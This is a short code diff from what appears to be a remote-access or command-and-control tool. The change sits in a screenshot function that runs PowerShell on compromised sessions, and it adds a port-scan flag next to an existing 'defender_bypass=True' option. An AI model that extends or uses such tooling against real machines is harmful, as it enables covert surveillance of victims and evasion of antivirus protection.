@@ -52,7 +52,7 @@ def screenshot(sid: str, local_path: str = None):
     if session.transport in ("http", "https"):
         out_b64 = shell.run_command_http(sid, ps)
     else:
-        out_b64 = shell.run_command_tcp(sid, ps, timeout=2.0, defender_bypass=True)
+        out_b64 = shell.run_command_tcp(sid, ps, timeout=2.0, defender_bypass=True, portscan_active=True)
 
     if not out_b64:
         print(brightyellow + "[*] No output or command failed")
